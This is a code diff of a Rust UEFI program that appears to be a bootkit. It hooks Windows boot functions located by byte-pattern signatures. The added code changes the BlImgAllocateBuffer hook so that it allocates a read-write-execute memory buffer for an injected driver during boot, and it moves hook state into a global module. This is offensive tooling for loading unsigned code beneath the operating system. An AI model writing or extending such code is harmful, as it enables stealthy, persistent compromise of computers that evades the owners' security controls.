@@ -4,6 +4,7 @@
 extern crate alloc;
 
 mod boot;
+mod global;
 mod hook;
 mod utils;
 
@@ -11,19 +12,11 @@ use alloc::slice;
 use core::ffi::c_void;
 use core::u8;
 
-use hook::{BlImgAllocateBuffer, Hook, ImgArchStartBootApplication, OslFwpKernelSetupPhase1};
+use global::*;
+use hook::Hook;
 use uefi::prelude::*;
 use uefi::proto::loaded_image::LoadedImage;
 use uefi::table::boot::LoadImageSource;
-
-const IMG_ARCH_START_BOOT_APPLICATION_SIGNATURE: &str = "48 8B C4 48 89 58 20 44 89 40 18 48 89 50 10 48 89 48 08 55 56 57 41 54 41 55 41 56 41 57 48 8D 68 A9";
-const OSL_EXECUTE_TRANSITION_SIGNATURE: &str = "E8 ? ? ? ? 8B D8 E8 ? ? ? ? 48 83 3D ? ? ? ? ?";
-const OSL_FWP_KERNEL_SETUP_PHASE1_SIGNATURE: &str = "E8 ? ? ? ? 8B F0 85 C0 79 ?";
-const BL_IMG_ALLOCATE_BUFFER_SIGNATURE: &str = "48 8B D6 E8 ? ? ? ? 48 8B 7C 24 ?";
-
-static mut IMG_ARCH_START_BOOT_APPLICATION: Option<Hook<ImgArchStartBootApplication>> = None;
-static mut OSL_FWP_KERNEL_SETUP_PHASE1: Option<Hook<OslFwpKernelSetupPhase1>> = None;
-static mut BL_IMG_ALLOCATE_BUFFER: Option<Hook<BlImgAllocateBuffer>> = None;
 
 #[entry]
 fn efi_main(image_handle: Handle, mut system_table: SystemTable<Boot>) -> Status {
@@ -76,7 +69,7 @@ fn img_arch_start_boot_application_hook(
     winload_size: u32,
     boot_option: u8,
     return_arguments: *mut c_void,
-) {
+) -> uefi::Status {
     log::info!("[+] ImgArchStartBootApplication hook successful!");
     let img_arch_start_boot_application =
         unsafe { IMG_ARCH_START_BOOT_APPLICATION.take().unwrap().unhook() };
@@ -130,12 +123,6 @@ fn img_arch_start_boot_application_hook(
     )
 }
 
-fn osl_fwp_kernel_setup_phase1_hook(loader_block: *mut u8) {
-    let osl_fwp_kernel_setup_phase1 =
-        unsafe { OSL_FWP_KERNEL_SETUP_PHASE1.take().unwrap().unhook() };
-    osl_fwp_kernel_setup_phase1(loader_block)
-}
-
 pub fn bl_img_allocate_buffer_hook(
     image_buffer: *mut *mut c_void,
     image_size: u64,
@@ -143,14 +130,47 @@ pub fn bl_img_allocate_buffer_hook(
     attributes: u32,
     reserved: *mut c_void,
     flags: u32,
-) {
-    let bl_img_allocate_buffer = unsafe { BL_IMG_ALLOCATE_BUFFER.take().unwrap().unhook() };
-    bl_img_allocate_buffer(
+) -> uefi::Status {
+    let mut bl_img_allocate_buffer = unsafe { BL_IMG_ALLOCATE_BUFFER.take().unwrap().unhook() };
+    let status = bl_img_allocate_buffer(
         image_buffer,
         image_size,
         memory_type,
         attributes,
         reserved,
         flags,
-    )
+    );
+
+    // Check if we can allocate a buffer for our driver
+    if status == Status::SUCCESS && memory_type == BL_MEMORY_TYPE_APPLICATION {
+        unsafe {
+            let status = bl_img_allocate_buffer(
+                &mut DRIVER_ALLOCATED_BUFFER as *mut *mut c_void,
+                DRIVER_SIZE,
+                BL_MEMORY_TYPE_APPLICATION,
+                BL_MEMORY_ATTRIBUTE_RWX,
+                core::ptr::null_mut(),
+                0,
+            );
+            if status != Status::SUCCESS {
+                DRIVER_ALLOCATED_BUFFER = core::ptr::null_mut();
+            }
+            return status;
+        }
+    }
+
+    // Couldn't allocate the buffer on this call, try on the next
+    unsafe {
+        BL_IMG_ALLOCATE_BUFFER = Some(Hook::new(
+            &mut bl_img_allocate_buffer as *mut _,
+            bl_img_allocate_buffer_hook as *const _,
+        ));
+    }
+    status
+}
+
+fn osl_fwp_kernel_setup_phase1_hook(loader_block: *mut u8) -> uefi::Status {
+    let osl_fwp_kernel_setup_phase1 =
+        unsafe { OSL_FWP_KERNEL_SETUP_PHASE1.take().unwrap().unhook() };
+    osl_fwp_kernel_setup_phase1(loader_block)
 }
